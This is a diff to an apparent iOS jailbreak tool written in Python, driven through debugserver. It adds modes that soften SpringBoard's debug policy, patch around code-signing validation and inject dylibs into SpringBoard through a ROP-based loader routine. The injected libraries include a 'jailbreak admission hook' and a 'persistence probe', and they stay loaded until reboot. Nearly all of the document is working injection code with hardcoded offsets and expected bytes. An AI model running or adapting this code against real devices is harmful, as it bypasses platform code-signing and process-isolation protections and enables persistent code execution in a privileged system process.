@@ -48,6 +48,18 @@ from debugserver_carrier_spawn import (
 
 LOADER_SUFFIX = "/procursus/usr/libexec/codex-ellekit-loader"
 SPRINGBOARD_PATH = "/System/Library/CoreServices/SpringBoard.app/SpringBoard"
+RESIDENT_HOOK_PATH = (
+    "/var/jb/usr/lib/codex-dyld-jb-admission-hook.dylib"
+)
+RESIDENT_CANARY_PATH = (
+    "/var/jb/usr/lib/codex-springboard-live-canary.dylib"
+)
+EXEC_CANDIDATE_TRACE_PROBE_PATH = (
+    "/private/var/mobile/Media/codex-exec-candidate-trace-probe.dylib"
+)
+EXEC_CANDIDATE_TRACE_PROBE_SYMBOL = (
+    "_codex_exec_cs_persistence_probe_start_async"
+)
 AMFID_PATH = "/usr/libexec/amfid"
 CRYPTEXD_PATH = "/usr/libexec/cryptexd"
 CRYPTEXD_UUID = uuid.UUID("261f91f3-7016-35a2-9a84-c85d2b6a834e")
@@ -196,6 +208,7 @@ AMFI_VALIDATE_SUCCESS_ORIGINAL = bytes.fromhex(
 AMFI_VALIDATE_BRANCH_PATCHED = bytes.fromhex("1d000014")
 MACH_TASK_SELF_GOT_OFFSET = 0x144D0
 MAIN_OFFSET = 0x4000
+SOFTEN_TARGET_OFFSET = 0x4E08
 KILL_STUB_OFFSET = 0xB258
 MACH_PORT_DEALLOCATE_STUB_OFFSET = 0xB278
 MACH_VM_DEALLOCATE_STUB_OFFSET = 0xB298
@@ -217,6 +230,8 @@ CREATE_REMOTE_PTHREAD_OFFSET = 0x8918
 MAKE_SYM_CALLABLE_OFFSET = 0x9004
 ARB_CALL_OFFSET = 0x902C
 PREPARE_FOR_MAGIC_OFFSET = 0x998C
+INJECT_DYLIB_VIA_ROP_OFFSET = 0x9F24
+REALPATH_STUB_OFFSET = 0xB3F8
 MAKE_SYM_CALLABLE_PROLOGUE = bytes.fromhex(
     "ff4300d1e00700f9e80740f9"
 )
@@ -261,6 +276,9 @@ USE_EXPERIMENTAL_BORROWED_JSC_THREAD = False
 
 EXPECTED_LOADER_CODE = {
     MAIN_OFFSET: bytes.fromhex("7f2303d5fc6fbea9fd7b01a9fd430091"),
+    SOFTEN_TARGET_OFFSET: bytes.fromhex(
+        "7f2303d5fc6fbea9fd7b01a9fd430091"
+    ),
     GET_REMOTE_IMAGE_ADDRESS_OFFSET: bytes.fromhex(
         "7f2303d5ff4302d1fd7b08a9fd030291"
     ),
@@ -285,6 +303,9 @@ EXPECTED_LOADER_CODE = {
     PREPARE_FOR_MAGIC_OFFSET: bytes.fromhex(
         "7f2303d5ffc301d1fd7b06a9fd830191"
     ),
+    INJECT_DYLIB_VIA_ROP_OFFSET: bytes.fromhex(
+        "7f2303d5ff0302d1fd7b07a9fdc30191"
+    ),
     KILL_STUB_OFFSET: bytes.fromhex(
         "510000b031620b91300240f9110a1fd7"
     ),
@@ -302,6 +323,9 @@ EXPECTED_LOADER_CODE = {
     ),
     PROC_PIDPATH_STUB_OFFSET: bytes.fromhex(
         "510000b031020e91300240f9110a1fd7"
+    ),
+    REALPATH_STUB_OFFSET: bytes.fromhex(
+        "510000b031420e91300240f9110a1fd7"
     ),
     TASK_FOR_PID_STUB_OFFSET: bytes.fromhex(
         "510000b031a20f91300240f9110a1fd7"
@@ -480,12 +504,38 @@ def parse_args() -> argparse.Namespace:
         help="validate the suspended loader state and detach",
     )
     modes.add_argument(
+        "--run-exec-candidate-trace-probe",
+        action="store_true",
+        help=(
+            "load and start the fixed disposable traced-exec candidate "
+            "probe inside the exact trusted loader"
+        ),
+    )
+    modes.add_argument(
         "--thread-probe",
         metavar="SPRINGBOARD_PID",
         type=int,
         help=(
             "create one loader-controlled SpringBoard pthread and call only "
             "the existing signed getpid function"
+        ),
+    )
+    modes.add_argument(
+        "--resident-inject-hook",
+        metavar="SPRINGBOARD_PID",
+        type=int,
+        help=(
+            "load the fixed jailbreak admission hook into SpringBoard and "
+            "retain its dlopen handle for the process lifetime"
+        ),
+    )
+    modes.add_argument(
+        "--resident-inject-canary",
+        metavar="SPRINGBOARD_PID",
+        type=int,
+        help=(
+            "load the fixed live canary into SpringBoard and retain its "
+            "dlopen handle for the process lifetime"
         ),
     )
     modes.add_argument(
@@ -774,6 +824,12 @@ async def continue_thread_with_signal(
 async def run(args: argparse.Namespace) -> int:
     if args.pid <= 1 or args.expected_parent <= 1:
         raise ProtocolError("refusing PID 1 or an invalid PID")
+    resident_target = (
+        args.resident_inject_hook
+        if args.resident_inject_hook is not None
+        else args.resident_inject_canary
+    )
+    resident_injection_mode = resident_target is not None
     requested_target = (
         args.thread_probe
         if args.thread_probe is not None
@@ -833,6 +889,8 @@ async def run(args: argparse.Namespace) -> int:
             )
         )
     )
+    if resident_injection_mode:
+        requested_target = resident_target
     if requested_target is not None and requested_target <= 1:
         raise ProtocolError("refusing PID 1 or an invalid SpringBoard PID")
     if args.timeout <= 0 or args.timeout > 120:
@@ -1162,6 +1220,165 @@ async def run(args: argparse.Namespace) -> int:
                 )
                 return returned.x0
 
+            if args.run_exec_candidate_trace_probe:
+                task_self_pointer_raw = struct.unpack(
+                    "<Q",
+                    await read_memory(
+                        remote, image_base + MACH_TASK_SELF_GOT_OFFSET, 8
+                    ),
+                )[0]
+                task_self_pointer = task_self_pointer_raw & USER_VA_MASK
+                if task_self_pointer == 0 or task_self_pointer & 3:
+                    raise ProtocolError(
+                        "loader mach_task_self_ pointer is invalid: "
+                        f"0x{task_self_pointer_raw:x}"
+                    )
+                task_self = struct.unpack(
+                    "<I", await read_memory(remote, task_self_pointer, 4)
+                )[0]
+                if task_self == 0:
+                    raise ProtocolError("loader mach_task_self_ port is null")
+
+                local_dyld_info_address = scratch + LOCAL_DYLD_INFO_OFFSET
+                local_dyld_count_address = scratch + LOCAL_DYLD_COUNT_OFFSET
+                await write_memory(remote, local_dyld_info_address, b"\0" * 24)
+                await write_memory(
+                    remote,
+                    local_dyld_count_address,
+                    struct.pack("<I", TASK_DYLD_INFO_COUNT),
+                )
+                local_dyld_result = await call_loader(
+                    "task_info_loader_dyld_exec_candidate_probe",
+                    image_base + TASK_INFO_STUB_OFFSET,
+                    (
+                        task_self,
+                        TASK_DYLD_INFO,
+                        local_dyld_info_address,
+                        local_dyld_count_address,
+                    ),
+                )
+                if local_dyld_result & 0xFFFFFFFF:
+                    raise ProtocolError(
+                        "loader TASK_DYLD_INFO failed: "
+                        f"{local_dyld_result & 0xFFFFFFFF}"
+                    )
+                local_all_image_info = struct.unpack(
+                    "<Q", await read_memory(remote, local_dyld_info_address, 8)
+                )[0]
+                if local_all_image_info == 0:
+                    raise ProtocolError(
+                        "loader TASK_DYLD_INFO returned null"
+                    )
+
+                async def set_probe_string(value: str, offset: int) -> int:
+                    encoded = value.encode("utf-8") + b"\0"
+                    if len(encoded) > 0x100:
+                        raise ProtocolError("probe string is too long")
+                    address = scratch + offset
+                    await write_memory(
+                        remote, address, encoded + b"\0" * (0x100 - len(encoded))
+                    )
+                    return address
+
+                libdyld_path = await set_probe_string(LIBDYLD_PATH, 0x000)
+                libdyld_image_raw = await call_loader(
+                    "getRemoteImageAddress_loader_exec_candidate_probe",
+                    image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
+                    (task_self, local_all_image_info, libdyld_path),
+                )
+                libdyld_image = libdyld_image_raw & USER_VA_MASK
+                dlopen_symbol = await set_probe_string("_dlopen", 0x100)
+                dlopen_raw = await call_loader(
+                    "remoteDlSym_loader_dlopen_exec_candidate_probe",
+                    image_base + REMOTE_DLSYM_OFFSET,
+                    (task_self, libdyld_image, dlopen_symbol),
+                )
+                dlopen_address = dlopen_raw & USER_VA_MASK
+                if libdyld_image == 0 or dlopen_address == 0:
+                    raise ProtocolError("could not resolve loader-local dlopen")
+
+                probe_path = await set_probe_string(
+                    EXEC_CANDIDATE_TRACE_PROBE_PATH, 0x200
+                )
+                probe_handle_raw = await call_loader(
+                    "dlopen_exec_candidate_trace_probe",
+                    dlopen_address,
+                    (probe_path, RTLD_NOW_LOCAL),
+                )
+                probe_handle = probe_handle_raw & USER_VA_MASK
+                if probe_handle == 0:
+                    dlerror_symbol = await set_probe_string("_dlerror", 0x400)
+                    dlerror_raw = await call_loader(
+                        "remoteDlSym_loader_dlerror_exec_candidate_probe",
+                        image_base + REMOTE_DLSYM_OFFSET,
+                        (task_self, libdyld_image, dlerror_symbol),
+                    )
+                    dlerror_address = dlerror_raw & USER_VA_MASK
+                    error_text = "unavailable"
+                    if dlerror_address != 0:
+                        error_pointer_raw = await call_loader(
+                            "dlerror_exec_candidate_trace_probe",
+                            dlerror_address,
+                            (),
+                        )
+                        error_pointer = error_pointer_raw & USER_VA_MASK
+                        if error_pointer != 0:
+                            error_bytes = bytearray()
+                            while len(error_bytes) < 1024:
+                                chunk = await read_memory(
+                                    remote,
+                                    error_pointer + len(error_bytes),
+                                    min(64, 1024 - len(error_bytes)),
+                                )
+                                terminator = chunk.find(b"\0")
+                                if terminator >= 0:
+                                    error_bytes.extend(chunk[:terminator])
+                                    break
+                                error_bytes.extend(chunk)
+                            error_text = error_bytes.decode(
+                                "utf-8", "replace"
+                            )
+                    raise ProtocolError(
+                        "loader-local exec candidate probe dlopen failed: "
+                        f"{error_text}"
+                    )
+
+                probe_image_raw = await call_loader(
+                    "getRemoteImageAddress_exec_candidate_trace_probe",
+                    image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
+                    (task_self, local_all_image_info, probe_path),
+                )
+                probe_image = probe_image_raw & USER_VA_MASK
+                probe_symbol = await set_probe_string(
+                    EXEC_CANDIDATE_TRACE_PROBE_SYMBOL, 0x300
+                )
+                probe_start_raw = await call_loader(
+                    "remoteDlSym_exec_candidate_trace_probe_start",
+                    image_base + REMOTE_DLSYM_OFFSET,
+                    (task_self, probe_image, probe_symbol),
+                )
+                probe_start = probe_start_raw & USER_VA_MASK
+                if probe_image == 0 or probe_start == 0:
+                    raise ProtocolError(
+                        "could not resolve exec candidate probe entry"
+                    )
+                start_result = await call_loader(
+                    "exec_candidate_trace_probe_start_async",
+                    probe_start,
+                    (),
+                )
+                if start_result & 0xFFFFFFFF:
+                    raise ProtocolError(
+                        "exec candidate trace probe start failed: "
+                        f"{start_result & 0xFFFFFFFF}"
+                    )
+                print(
+                    "exec-candidate-trace-probe=started "
+                    f"loader={args.pid} image=0x{probe_image:x} "
+                    "dlclose=omitted removal=reboot"
+                )
+                return 0
+
             target_pid = requested_target
             path_address = scratch + PATH_BUFFER_OFFSET
             task_address = scratch + TASK_PORT_OFFSET
@@ -1321,6 +1538,105 @@ async def run(args: argparse.Namespace) -> int:
                     f"thread-probe-dyld address=0x{all_image_info:x} "
                     f"size=0x{all_image_info_size:x}"
                 )
+
+                if resident_injection_mode:
+                    soften_result = await call_loader(
+                        "soften_target_resident",
+                        image_base + SOFTEN_TARGET_OFFSET,
+                        (target_pid, path_address),
+                    )
+                    if (soften_result & 1) == 0:
+                        raise ProtocolError(
+                            "SpringBoard debug-policy softening failed"
+                        )
+
+                    requested_dylib = (
+                        RESIDENT_HOOK_PATH
+                        if args.resident_inject_hook is not None
+                        else RESIDENT_CANARY_PATH
+                    )
+                    requested_bytes = requested_dylib.encode("utf-8") + b"\0"
+                    if len(requested_bytes) > PATH_BUFFER_SIZE:
+                        raise ProtocolError("resident dylib path is too long")
+                    await write_memory(
+                        remote,
+                        path_address,
+                        requested_bytes
+                        + b"\0" * (PATH_BUFFER_SIZE - len(requested_bytes)),
+                    )
+                    resolved_address = scratch + LOCAL_STRING_OFFSET
+                    await write_memory(
+                        remote, resolved_address, b"\0" * LOCAL_STRING_SIZE
+                    )
+                    realpath_raw = await call_loader(
+                        "realpath_resident_dylib",
+                        image_base + REALPATH_STUB_OFFSET,
+                        (path_address, resolved_address),
+                    )
+                    if (realpath_raw & USER_VA_MASK) != resolved_address:
+                        raise ProtocolError(
+                            f"realpath failed for {requested_dylib}"
+                        )
+                    resolved_bytes = await read_memory(
+                        remote, resolved_address, LOCAL_STRING_SIZE
+                    )
+                    if b"\0" not in resolved_bytes:
+                        raise ProtocolError(
+                            "resolved resident dylib path is unterminated"
+                        )
+                    resolved_dylib = resolved_bytes.split(b"\0", 1)[0].decode(
+                        "utf-8", "strict"
+                    )
+                    expected_suffix = (
+                        "/procursus/usr/lib/"
+                        + requested_dylib.rsplit("/", 1)[-1]
+                    )
+                    if not (
+                        resolved_dylib.startswith("/private/preboot/")
+                        and resolved_dylib.endswith(expected_suffix)
+                    ):
+                        raise ProtocolError(
+                            "refusing unexpected resident dylib realpath: "
+                            f"{resolved_dylib!r}"
+                        )
+
+                    before_raw = await call_loader(
+                        "getRemoteImageAddress_resident_before",
+                        image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
+                        (target_task, all_image_info, resolved_address),
+                    )
+                    before = before_raw & USER_VA_MASK
+                    if before == 0:
+                        await call_loader(
+                            "injectDylibViaRop_resident",
+                            image_base + INJECT_DYLIB_VIA_ROP_OFFSET,
+                            (
+                                target_task,
+                                target_pid,
+                                resolved_address,
+                                all_image_info,
+                            ),
+                        )
+                        await asyncio.sleep(0.25)
+
+                    after_raw = await call_loader(
+                        "getRemoteImageAddress_resident_after",
+                        image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
+                        (target_task, all_image_info, resolved_address),
+                    )
+                    after = after_raw & USER_VA_MASK
+                    if after == 0:
+                        raise ProtocolError(
+                            "resident dylib is absent after injection"
+                        )
+                    print(
+                        "springboard-resident-injection=success "
+                        f"pid={target_pid} image=0x{after:x} "
+                        f"alreadyLoaded={'true' if before else 'false'} "
+                        f"path={resolved_dylib} dlclose=omitted "
+                        "removal=reboot"
+                    )
+                    return 0
 
                 if args.cleanup_rop_thread is not None:
                     await call_loader(
